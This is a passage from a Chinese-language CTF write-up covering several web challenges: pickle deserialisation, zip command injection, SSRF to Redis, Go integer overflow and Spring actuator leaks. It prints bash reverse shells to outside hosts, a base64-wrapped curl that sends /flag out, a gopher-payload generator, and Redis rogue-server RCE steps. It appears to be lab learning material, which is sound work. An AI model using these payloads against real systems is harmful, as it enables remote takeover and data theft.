href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/]">https://www.k0rz3n.com/2018/08/05/Linux反弹shell（二）反弹shell的本质/]</a>(<a href="https://www.k0rz3n.com/2018/08/05/Linux">https://www.k0rz3n.com/2018/08/05/Linux</a> 反弹shell （二）反弹shell的本质&#x2F;)</p><p>然后你得知道上面这个反弹 shell 的语法其实是 bash 自身的特性, 而其它 shell 例如 sh, zsh 并不支持这个功能</p><p>对于题目的环境而言, 当你执行这条命令的时候, 它实际上是在 sh 的 context 中执行的, <code>&gt;&amp;</code> 以及 <code>/dev/tcp/IP/Port</code> 会被 sh 解析, 而不是 bash, 因此会报错</p><p>解决方法也很简单, 将上面的命令使用 <code>bash -c &quot;&quot;</code> 包裹起来, 即</p><div class="code-wrapper"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/host.docker.internal/4444 0&gt;&amp;1&quot;</span></code></pre></div><p>让 <code>&gt;&amp;</code> 以及 <code>/dev/tcp/IP/Port</code> 都被 bash 解析, 就能反弹成功了</p></blockquote><p>说的很好，提到的pickle部分在学习中都有了解到</p><p>说一下自己sb的地方，我直接拿CNSS的payload去打，但是我忘了那是在URL中输入的，进行了url编码，这里换行直接用<code>\n</code>就行</p><div class="code-wrapper"><pre><code class="hljs 1c">b&#x27;(S\&#x27;bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/7777 0&gt;&amp;1&quot;</span>\&#x27;\nios\nsystem\n.&#x27;</code></pre></div><p>并且上面说到反弹shell说的很好，一定要加上<code>bash -c</code>，直接<code>bash -i</code>是不行的，但我在CNSS是可以直接<code>bash -i</code>的，现在想来应该是CNSS恰好用的是<code>bash</code>，而该题目应该用的是其他<code>shell</code>，要加上<code>bash -c</code>让他被bash解析</p><div class="code-wrapper"><pre><code class="hljs csp">flask-unsign --sign --cookie &quot;&#123;<span class="hljs-string">&#x27;notes&#x27;</span>: &#123;<span class="hljs-string">&#x27;evil&#x27;</span>: b<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;cos\nsystem\n(S&#x27;</span>bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xx.xx/4444 0&gt;&amp;1\&quot;<span class="hljs-string">&#x27;\ntR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;&quot; --secret 6061 --no-literal-eval</code></pre></div><p>要加上<code>--no-literal-eval</code>，不然生成结果不一样</p><p>再说明一下，要在linux环境下运行才可以（当然出题人的mac也行），</p><p>windows下是无法使用<code>\</code>进行转义的</p><p>在 Windows 的 cmd 中，如果你已经使用了双引号括起整个字符串，而字符串内部又需要包含双引号，可以<strong>使用两个双引号来表示一个双引号</strong>。这是 Windows 命令行的规则。</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122111735938.png" alt="image-20231122111735938"></p><h2 id="RSS-parser"><a href="#RSS-parser" class="headerlink" title="RSS parser"></a>RSS parser</h2><p>搜一下就知道RSS语法与xml有关，于是想到XXE漏洞</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122123119964.png" alt="image-20231122123119964"></p><p>无法直接读取&#x2F;flag，随便输入以http或https开头的url，能看到是flask的debug页面</p><p>于是算pin码</p><p>但这里奇怪的是wp中说<code>/etc/machine-id</code>是没有值的，但我用docker启动题目是可以读取到值的</p><p>不说了，没一次是算对的</p><h2 id="zip-manager"><a href="#zip-manager" class="headerlink" title="zip_manager"></a>zip_manager</h2><p>服了，题目给的docker启动了，访问不了，挺想做的</p><p>题目实现了在线解压缩 zip 文件的功能, 但是不能进行目录穿越</p><div class="code-wrapper"><pre><code class="hljs python">os.system(<span class="hljs-string">&#x27;unzip -o &#123;&#125; -d &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(zip_path, dest_path))</code></pre></div><p>可以有两种方法：zip 软链接和命令注入</p><p>unzip -o 很明显能够使用软链接         2023国赛也出过</p><div class="code-wrapper"><pre><code class="hljs stata">ln -s / <span class="hljs-keyword">test</span> <span class="hljs-keyword">zip</span> -y <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span></code></pre></div><p>上传后访问 <code>http://127.0.0.1:50033/test/test/</code></p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122132634217.png" alt="image-20231122132634217"></p><p>然后使用os.system也很明显，<code>;</code>绕过，文件名处命令执行，要以<code>.zip</code>结尾</p><div class="code-wrapper"><pre><code class="hljs bash">test.zip;<span class="hljs-built_in">echo</span> Y3VybCBob3N0LmRvY2tlci5pbnRlcm5hbDo0NDQ0IC1UIC9mbGFnCg==|<span class="hljs-built_in">base64</span> -d|bash;1.zip</code></pre></div><h2 id="web-snapshot"><a href="#web-snapshot" class="headerlink" title="web_snapshot"></a>web_snapshot</h2><p>ssrf打redis，虽然知道主从复制，但是确实不会操作，算是保存脚本吧，学到了</p><p>限制输入的 url 只能以 http &#x2F; https 开头</p><p>注意 <code>curl_setopt</code> 设置的参数 <code>CURLOPT_FOLLOWLOCATION</code>, 代表允许 curl 根据返回头中的 Location 进行重定向</p><p>而 curl 支持 dict &#x2F; gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict &#x2F; gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到</p><p>结合 redis 的知识点, 可以尝试 redis 主从复制 rce</p><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><div class="code-wrapper"><pre><code class="hljs python">//生成gopher协议脚本<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):    enc_data = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:            enc_data += <span class="hljs-string">&#x27;%0&#x27;</span> + h.upper()        <span class="hljs-keyword">else</span>:            enc_data += <span class="hljs-string">&#x27;%&#x27;</span> + h.upper()    <span class="hljs-keyword">return</span> enc_data<span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):    redis_payload = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">&#x27;\n&#x27;</span>):        arg_num = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&#x27; &#x27;</span>)))        redis_payload += arg_num + <span class="hljs-string">&#x27;\r\n&#x27;</span>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">&#x27; &#x27;</span>):            arg_len = <span class="hljs-string">&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))            redis_payload += arg_len + <span class="hljs-string">&#x27;\r\n&#x27;</span>            redis_payload += j + <span class="hljs-string">&#x27;\r\n&#x27;</span>    gopher_payload = <span class="hljs-string">&#x27;gopher://db:6379/_&#x27;</span> + urlencode(redis_payload)    <span class="hljs-keyword">return</span> gopher_payloadpayload1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">slaveof vps_ip 21000     //vps上启动的redis-rogue-server的端口</span><span class="hljs-string">config set dir /tmp</span><span class="hljs-string">config set dbfilename exp.so</span><span class="hljs-string">quit</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload2 = <span class="hljs-string">&#x27;&#x27;&#x27;slaveof no one</span><span class="hljs-string">module load /tmp/exp.so</span><span class="hljs-string">system.exec &#x27;env&#x27;</span><span class="hljs-string">quit</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-built_in">print</span>(gen_payload(payload1))<span class="hljs-built_in">print</span>(gen_payload(payload2))</code></pre></div><p>利用php代码 从 http 重定向至 dict &#x2F; gopher</p><p>分两次打</p><div class="code-wrapper"><pre><code class="hljs llvm">&lt;?php// step <span class="hljs-number">1</span>header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%37</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%66</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>B<span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%32</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%70</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A&#x27;)<span class="hljs-comment">;</span><span class="hljs-comment"></span>// step <span class="hljs-number">2</span>// header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%37</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%66</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>E<span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>F<span class="hljs-variable">%6</span>E<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%33</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%36</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>D<span class="hljs-variable">%6</span>F<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%6</span>C<span class="hljs-variable">%6</span>F<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%70</span><span class="hljs-variable">%2</span>E<span class="hljs-variable">%73</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%32</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%31</span><span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%73</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>D<span class="hljs-variable">%2</span>E<span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%27</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%76</span><span class="hljs-variable">%27</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%69</span><span class="hljs-variable">%74</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%2</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span><span class="hljs-variable">%30</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A&#x27;)<span class="hljs-comment">;</span></code></pre></div><p>在 vps 上启动 <code>php -S 0.0.0.0:65000</code>（跟python启动http.server差不多）, 然后让题目去访问这个 php 文件</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153720563.png" alt="image-20231122153720563"></p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153647044.png" alt="image-20231122153647044"></p><p>第二次打完之后, 访问给出的 link 拿到回显</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122153822385.png" alt="image-20231122153822385"></p><blockquote><p>wp提醒的几个点</p><p>首先 gopher 得分两次打, 不然你在执行 <code>slaveof IP Port</code> 命令之后又立即执行了 <code>slave of no one</code>, 这就导致根本没有时间去主从复制 exp.so</p><p>其次在使用 gopher 发送 redis 命令的时候记得结尾加上 <code>quit</code>, 不然会一直卡住</p><p>然后注意 redis 的主机名是 <code>db</code>, 而不是 <code>127.0.0.1</code>, 因此访问 redis 数据库得用 <code>db:6379</code></p><p>如果用 dict 协议打的话, 得调整一下 payload 顺序</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/tmp</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slaveof</span><span class="hljs-symbol">:host</span>.docker.<span class="hljs-symbol">internal:</span><span class="hljs-number">21000</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:load</span><span class="hljs-symbol">:/tmp/exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slave</span><span class="hljs-symbol">:no</span><span class="hljs-symbol">:one</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/system</span>.<span class="hljs-symbol">exec:</span>env <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:unload</span><span class="hljs-symbol">:system</span></code></pre></div><p>因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 <code>/data/dump.rdb</code></p></blockquote><h2 id="go-shop"><a href="#go-shop" class="headerlink" title="go shop"></a>go shop</h2><p>题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag</p><p>往 number 里面填负数或者小数这种思路都是不行的, 需要仔细看代码的逻辑</p><div class="code-wrapper"><pre><code class="hljs go">n, _ := strconv.Atoi(data[<span class="hljs-string">&quot;num&quot;</span>].(<span class="hljs-type">string</span>))<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> &#123;    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;        <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Product num can&#x27;t be negative&quot;</span>,    &#125;)    <span class="hljs-keyword">return</span>&#125;<span class="hljs-keyword">if</span> user.Money &gt;= product.Price*<span class="hljs-type">int64</span>(n) &#123;    user.Money -= product.Price * <span class="hljs-type">int64</span>(n)    user.Items[product.Name] += <span class="hljs-type">int64</span>(n)    c.JSON(<span class="hljs-number">200</span>, gin.H&#123;        <span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;Buy %v * %v success&quot;</span>, product.Name, n),    &#125;)</code></pre></div><blockquote><p>Go 语言是强类型语言, 包含多种数据类型, 以数字类型为例, 存在 uint8 uint16 uint32 uint64 (无符号整型) 和 int8 int16 int32 int64 (有符号整型) 等类型</p><p>Go 语言在编译期会检查源码中定义的变量是否存在溢出, 例如 <code>var i uint8 = 99999</code> 会使得编译不通过, 但是并不会检查变量的运算过程中是否存在溢出, 例如 <code>var i uint8 = a * b</code>, 如果程序没有对变量的取值范围做限制, 那么在部分场景下就可能存在整数溢出漏洞</p><p>上面的 BuyHandler 虽然限制了 n 不能为负数, 但是并没有限制 n 的最大值</p><p>因此我们可以控制 n, 使得 <code>product.Price * int64(n)</code> 溢出为一个负数, 之后进行 <code>user.Money -= product.Price * int64(n)</code> 运算的时候, 当前用户的 money 就会增加, 最终达到一个可以购买 flag 商品的金额, 从而拿到 flag</p><p>查阅相关文档可以知道 int64 类型的范围是 <code>-9223372036854775808 ~ 9223372036854775807</code></p><p>经过简单的计算或者瞎猜, 可以购买数量为 <code>922337203695477808</code> 的 apple</p></blockquote><p>因为<code>product.Price</code>也是int64</p><p>可以让<code>product.Price*int64(n)</code>的结果产生溢出，变为负数通过判断，并且变为负数money也会不断增加</p><p>也可以直接让<code>n</code>产生溢出，这样money会加的很少，但数量会变得很大，然后卖掉即可</p><h1 id="第四周-（java安全专题，但与gadget无关）"><a href="#第四周-（java安全专题，但与gadget无关）" class="headerlink" title="第四周 （java安全专题，但与gadget无关）"></a>第四周 （java安全专题，但与gadget无关）</h1><p>因为一直在学java，没怎么做过题目，所以看到是专题时挺感兴趣的</p><h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181651148.png" alt="image-20231122181651148"></p><p>考察spring actuator，<a href="https://xz.aliyun.com/t/9763#toc-12">https://xz.aliyun.com/t/9763#toc-12</a></p><p><code>/actuator/env</code> 可以发现 app.username 和 app.password 这两个环境变量</p><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181847546.png" alt="image-20231122181847546"></p><p>spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防止敏感信息泄露</p><p>但是我们可以通过 <code>/actuator/heapdump</code> 这个路由去导出 jvm 中的堆内存信息, 然后通过一定的查询得到 app.password 的明文</p><p><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p><p>使用内存分析工具解析<code>heapdump</code>文件</p><div class="code-wrapper"><pre><code class="hljs asciidoc">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump<span class="hljs-code">.........</span><span class="hljs-code">OriginTrackedMapPropertySource</span><span class="hljs-code">-------------</span>management.endpoints.web.exposure.include = *server.port = nullmanagement.endpoints.web.exposure.exclude = shutdown,refresh,restartapp.password = 0xGame&#123;1abbac75-e230-4390-9148-28c71e0098b9&#125;app.username = flag_is_the_password......</code></pre></div><h2 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth_bypass"></a>auth_bypass</h2><p>主要考察对war包结构的认识</p><p>题目附件给了 AuthFilter.java 和 DownloadServlet.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//AuthFilter.java</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest)req;    <span class="hljs-keyword">if</span> (request.getRequestURI().contains(<span class="hljs-string">&quot;..&quot;</span>)) &#123;        resp.getWriter().write(<span class="hljs-string">&quot;blacklist&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">if</span> (request.getRequestURI().startsWith(<span class="hljs-string">&quot;/download&quot;</span>)) &#123;            resp.getWriter().write(<span class="hljs-string">&quot;unauthorized access&quot;</span>);        &#125; <span class="hljs-keyword">else</span> &#123;            chain.doFilter(req, resp);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//DownloadServlet.java</span><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;    <span class="hljs-type">String</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/assets/&quot;</span>);    <span class="hljs-type">Object</span> <span class="hljs-variable">fileNameParameter</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);    <span class="hljs-keyword">if</span> (fileNameParameter != <span class="hljs-literal">null</span>) &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> (String)fileNameParameter;        resp.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + fileName);        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(currentPath + fileName);        <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];            <span class="hljs-keyword">while</span>(input.read(buffer) != -<span class="hljs-number">1</span>) &#123;                resp.getOutputStream().write(buffer);            &#125;        &#125; <span class="hljs-keyword">catch</span> (Throwable var16) &#123;            var7 = var16;            <span class="hljs-keyword">throw</span> var16;        &#125; <span class="hljs-keyword">finally</span> &#123;            <span class="hljs-keyword">if</span> (input != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;                    <span class="hljs-keyword">try</span> &#123;                        input.close();                    &#125; <span class="hljs-keyword">catch</span> (Throwable var15) &#123;                        var7.addSuppressed(var15);                    &#125;                &#125; <span class="hljs-keyword">else</span> &#123;                    input.close();                &#125;            &#125;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);        resp.getWriter().write(<span class="hljs-string">&quot;&lt;a href=\&quot;/download?filename=avatar.jpg\&quot;&gt;avatar.jpg&lt;/a&gt;&quot;</span>);    &#125;&#125;</code></pre></div><p>DownloadServlet 很明显存在任意文件下载, 但是 AuthFilter 限制不能访问 <code>/download</code> 路由</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span 